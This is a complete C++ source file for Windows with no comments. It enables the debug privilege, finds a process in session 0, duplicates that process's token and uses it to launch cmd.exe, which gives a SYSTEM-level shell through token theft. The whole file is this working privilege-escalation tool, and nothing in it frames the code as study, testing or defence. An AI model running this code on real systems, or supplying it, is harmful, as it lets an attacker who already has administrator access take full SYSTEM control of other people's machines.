#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

bool EnablePrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(nullptr, lpszPrivilege, &luid)) {
        std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::cerr << "The token does not have the specified privilege." << std::endl;
        return false;
    }

    return true;
}

HANDLE GetProcessHandleBySessionID(DWORD sessionID) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot failed: " << GetLastError() << std::endl;
        return nullptr;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE processHandle = nullptr;
    if (Process32First(snapshot, &processEntry)) {
        do {
            DWORD currentSessionID;
            if (ProcessIdToSessionId(processEntry.th32ProcessID, &currentSessionID) && currentSessionID == sessionID) {
                processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processEntry.th32ProcessID);
                if (processHandle) {
                    break;
                }
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return processHandle;
}

int main() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
        return 1;
    }

    if (!EnablePrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        CloseHandle(hToken);
        return 1;
    }

    CloseHandle(hToken);

    HANDLE processHandle = GetProcessHandleBySessionID(0);
    if (!processHandle) {
        std::cerr << "Failed to open target process: " << GetLastError() << std::endl;
        return 1;
    }

    HANDLE processToken = nullptr;
    if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &processToken)) {
        std::cerr << "Failed to open process token: " << GetLastError() << std::endl;
        CloseHandle(processHandle);
        return 1;
    }

    HANDLE newToken = nullptr;
    if (!DuplicateTokenEx(processToken, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenPrimary, &newToken)) {
        std::cerr << "Failed to duplicate token: " << GetLastError() << std::endl;
        CloseHandle(processToken);
        CloseHandle(processHandle);
        return 1;
    }

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessWithTokenW(newToken, LOGON_WITH_PROFILE, nullptr, const_cast<LPWSTR>(L"cmd.exe"), CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi)) {
        std::cerr << "CreateProcessWithTokenW failed: " << GetLastError() << std::endl;
        CloseHandle(newToken);
        CloseHandle(processToken);
        CloseHandle(processHandle);
        return 1;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(newToken);
    CloseHandle(processToken);
    CloseHandle(processHandle);

    return 0;
}
